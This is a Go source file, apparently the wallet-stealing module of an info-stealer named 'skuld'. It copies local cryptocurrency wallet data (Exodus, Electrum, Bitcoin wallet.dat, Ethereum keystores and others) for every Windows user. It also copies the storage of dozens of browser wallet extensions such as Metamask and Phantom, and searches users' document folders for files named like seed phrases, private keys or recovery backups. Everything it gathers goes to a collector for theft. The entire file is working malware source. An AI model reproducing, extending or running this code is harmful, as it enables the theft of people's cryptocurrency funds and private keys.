package wallets

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/hackirby/skuld/modules/browsers"
	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

func Run(dataCollector *collector.DataCollector) {
	Local(dataCollector)
	Extensions(dataCollector)
	CaptureWalletFiles(dataCollector)
}

func Local(dataCollector *collector.DataCollector) {
	users := hardware.GetUsers()
	tempDir := filepath.Join(os.TempDir(), "local-wallets-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)
	
	found := ""
	Paths := map[string]string{
		"Zcash":        "\\Zcash",
		"Armory":       "\\Armory",
		"Bytecoin":     "\\bytecoin",
		"Jaxx":         "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
		"Exodus":       "\\Exodus\\exodus.wallet",
		"ExodusData":   "\\Exodus",
		"Ethereum":     "\\Ethereum\\keystore",
		"Electrum":     "\\Electrum\\wallets",
		"ElectrumData": "\\Electrum",
		"AtomicWallet": "\\atomic\\Local Storage\\leveldb",
		"AtomicData":   "\\atomic",
		"Guarda":       "\\Guarda\\Local Storage\\leveldb",
		"GuardaData":   "\\Guarda",
		"Coinomi":      "\\Coinomi\\Coinomi\\wallets",
		"CoinomiData":  "\\Coinomi",
		"Bitcoin":      "\\Bitcoin",
		"Litecoin":     "\\Litecoin",
		"Dogecoin":     "\\Dogecoin",
		"Dash":         "\\DashCore",
		"Monero":       "\\Monero",
	}

	for _, user := range users {
		userPath := filepath.Join(user, "AppData", "Roaming")
		userLocalPath := filepath.Join(user, "AppData", "Local")

		for name, path := range Paths {
			// Check both Roaming and Local paths
			fullPath := filepath.Join(userPath, path)
			if !fileutil.IsDir(fullPath) && !fileutil.Exists(fullPath) {
				fullPath = filepath.Join(userLocalPath, path)
			}
			
			if !fileutil.IsDir(fullPath) && !fileutil.Exists(fullPath) {
				continue
			}

			destPath := filepath.Join(tempDir, strings.Split(user, "\\")[2], name)
			os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

			var err error
			if fileutil.IsDir(fullPath) {
				err = fileutil.CopyDir(fullPath, destPath)
			} else {
				err = fileutil.CopyFile(fullPath, destPath)
			}

			if err != nil {
				continue
			}

			found += fmt.Sprintf("\n✅ %s - %s", strings.Split(user, "\\")[2], name)
		}

		// Also check for wallet.dat files in common locations
		walletPaths := []string{
			filepath.Join(user, "AppData", "Roaming", "Bitcoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Litecoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "Dogecoin", "wallet.dat"),
			filepath.Join(user, "AppData", "Roaming", "DashCore", "wallet.dat"),
		}

		for _, walletPath := range walletPaths {
			if fileutil.Exists(walletPath) {
				destPath := filepath.Join(tempDir, strings.Split(user, "\\")[2], "WalletDat", filepath.Base(filepath.Dir(walletPath))+"_wallet.dat")
				os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
				
				if err := fileutil.CopyFile(walletPath, destPath); err == nil {
					found += fmt.Sprintf("\n✅ %s - %s wallet.dat", strings.Split(user, "\\")[2], filepath.Base(filepath.Dir(walletPath)))
				}
			}
		}
	}

	if found == "" {
		return
	}

	// Add local wallets data to collector
	walletsInfo := map[string]interface{}{
		"WalletsFound": found,
		"TreeView":     fileutil.Tree(tempDir, ""),
	}
	dataCollector.AddData("local_wallets", walletsInfo)
	dataCollector.AddDirectory("local_wallets", tempDir, "local_wallets_data")
}

func Extensions(dataCollector *collector.DataCollector) {
	Paths := map[string]string{
		"Authenticator":   "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai",
		"Binance":         "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
		"Bitapp":          "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi",
		"BoltX":           "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca",
		"Coin98":          "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg",
		"Coinbase":        "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
		"Core":            "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb",
		"Crocobit":        "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke",
		"Equal":           "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac",
		"Ever":            "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk",
		"ExodusWeb3":      "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno",
		"Fewcha":          "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj",
		"Finnie":          "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj",
		"Guarda":          "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln",
		"Guild":           "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj",
		"HarmonyOutdated": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib",
		"Iconex":          "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel",
		"Jaxx Liberty":    "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne",
		"Kaikas":          "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi",
		"KardiaChain":     "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk",
		"Keplr":           "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap",
		"Liquality":       "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn",
		"MEWCX":           "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm",
		"MaiarDEFI":       "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm",
		"Martian":         "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk",
		"Math":            "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc",
		"Metamask":        "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
		"Metamask2":       "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",
		"Mobox":           "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo",
		"Nami":            "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo",
		"Nifty":           "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid",
		"Oxygen":          "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh",
		"PaliWallet":      "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn",
		"Petra":           "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci",
		"Phantom":         "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
		"Pontem":          "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba",
		"Ronin":           "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec",
		"Safepal":         "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa",
		"Saturn":          "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig",
		"Slope":           "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo",
		"Solfare":         "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic",
		"Sollet":          "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno",
		"Starcoin":        "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk",
		"Swash":           "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog",
		"TempleTezos":     "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc",
		"TerraStation":    "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp",
		"Tokenpocket":     "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii",
		"Ton":             "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd",
		"Tron":            "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec",
		"Trust Wallet":    "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
		"Wombat":          "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih",
		"XDEFI":           "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf",
		"XMR.PT":          "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm",
		"XinPay":          "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo",
		"Yoroi":           "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb",
		"iWallet":         "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj",
	}

	users := hardware.GetUsers()
	browsersPath := browsers.GetChromiumBrowsers()
	var profilesPaths []browsers.Profile
	
	for _, user := range users {
		for name, path := range browsersPath {
			path = filepath.Join(user, path)
			if !fileutil.IsDir(path) {
				continue
			}

			browser := browsers.Browser{
				Name: name,
				Path: path,
				User: strings.Split(user, "\\")[2],
			}

			if browser.Name == "Opera" || browser.Name == "OperaGX" {
				profilesPaths = append(profilesPaths, browsers.Profile{
					Name:    "Default",
					Path:    browser.Path,
					Browser: browser,
				})
				continue
			}

			profiles, err := os.ReadDir(path)
			if err != nil {
				continue
			}
			for _, profile := range profiles {
				if profile.IsDir() {
					profilePath := filepath.Join(path, profile.Name())
					if fileutil.Exists(filepath.Join(profilePath, "Web Data")) {
						profilesPaths = append(profilesPaths, browsers.Profile{
							Name:    profile.Name(),
							Path:    profilePath,
							Browser: browser,
						})
					}
				}
			}
		}
	}

	if len(profilesPaths) == 0 {
		return
	}

	tempDir := filepath.Join(os.TempDir(), "wallet-extensions-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)
	
	found := ""

	for _, profile := range profilesPaths {
		for name, path := range Paths {
			fullPath := filepath.Join(profile.Path, path)
			if !fileutil.IsDir(fullPath) {
				continue
			}

			destPath := filepath.Join(tempDir, profile.Browser.User, profile.Browser.Name, profile.Name, name)
			os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

			err := fileutil.CopyDir(fullPath, destPath)
			if err != nil {
				continue
			}
			found += fmt.Sprintf("\n✅ %s - %s - %s", profile.Browser.User, profile.Browser.Name, name)
		}
	}

	if found == "" {
		return
	}

	// Add wallet extensions data to collector
	extensionsInfo := map[string]interface{}{
		"ExtensionsFound": found,
		"TreeView":        fileutil.Tree(tempDir, ""),
	}
	dataCollector.AddData("wallet_extensions", extensionsInfo)
	dataCollector.AddDirectory("wallet_extensions", tempDir, "wallet_extensions_data")
}

func CaptureWalletFiles(dataCollector *collector.DataCollector) {
	users := hardware.GetUsers()
	tempDir := filepath.Join(os.TempDir(), "wallet-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	found := ""
	walletKeywords := []string{
		"wallet", "seed", "mnemonic", "private", "key", "phrase", 
		"bitcoin", "ethereum", "crypto", "recovery", "backup",
		"metamask", "exodus", "atomic", "electrum", "jaxx",
	}

	for _, user := range users {
		userDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
			filepath.Join(user, "OneDrive"),
		}

		for _, dir := range userDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Skip large files
				if info.Size() > 10*1024*1024 { // 10MB
					return nil
				}

				fileName := strings.ToLower(info.Name())
				
				// Check for wallet-related keywords
				isWalletFile := false
				for _, keyword := range walletKeywords {
					if strings.Contains(fileName, keyword) {
						isWalletFile = true
						break
					}
				}

				// Check for specific wallet file extensions
				ext := strings.ToLower(filepath.Ext(fileName))
				walletExts := []string{".dat", ".wallet", ".json", ".txt", ".key", ".pem", ".p12", ".keystore"}
				for _, walletExt := range walletExts {
					if ext == walletExt && isWalletFile {
						destPath := filepath.Join(tempDir, strings.Split(user, "\\")[2], "WalletFiles", info.Name())
						os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
						
						if err := fileutil.CopyFile(path, destPath); err == nil {
							found += fmt.Sprintf("\n✅ %s - %s", strings.Split(user, "\\")[2], info.Name())
						}
						break
					}
				}

				return nil
			})
		}
	}

	if found != "" {
		walletFilesInfo := map[string]interface{}{
			"WalletFilesFound": found,
			"TreeView":         fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_files", walletFilesInfo)
		dataCollector.AddDirectory("wallet_files", tempDir, "wallet_files_data")
	}
}